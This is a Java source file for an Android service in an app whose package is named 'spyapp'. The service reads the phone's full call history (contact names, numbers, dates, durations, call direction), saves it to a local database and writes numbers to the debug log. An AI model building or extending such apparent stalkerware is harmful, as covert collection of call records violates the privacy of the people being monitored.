package com.app.spyapp.service;

import android.Manifest;
import android.app.IntentService;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.CallLogModel;

import java.util.ArrayList;
import java.util.Date;


public class CallLogService extends IntentService {
    private SpyApp spyApp;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public CallLogService() {

        super(CallLogService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        Utils.showStatus(this, "CALLLOG");
        ArrayList<CallLogModel> calllogList = getCallDetails();
        if (calllogList != null && calllogList.size() > 0) {
            for (int i = 0; i < calllogList.size(); i++) {
                spyApp.getDatabaseHelper().insertCallLog(calllogList.get(i));
            }
        }
    }

    private ArrayList<CallLogModel> getCallDetails() {

        ArrayList<CallLogModel> callLogList = new ArrayList<>();
        StringBuffer sb = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return null;
        }
        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int calllogid = managedCursor.getColumnIndex(CallLog.Calls._ID);

        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            CallLogModel callLogModel = new CallLogModel();
            String callogID = managedCursor.getString(calllogid);
            String uname = managedCursor.getString(name);
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            String callDayTime = Utils.convertMilisToDate(Long.parseLong(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            callLogModel.setCalllogId(callogID);
            callLogModel.setUsername(uname);
            callLogModel.setPhnNumber(phNumber);
            callLogModel.setCallDate(callDayTime);
            callLogModel.setCallDuration(callDuration);
            callLogModel.setDir(dir);
            callLogModel.setDircode(dircode);
            callLogModel.setCallType(callType);
            callLogList.add(callLogModel);

            Log.i("Debug", "getCallDetails: type="+dir+"\n"+"phone no"+callLogModel.getPhnNumber());
        }
        managedCursor.close();
        return callLogList;
    }
}
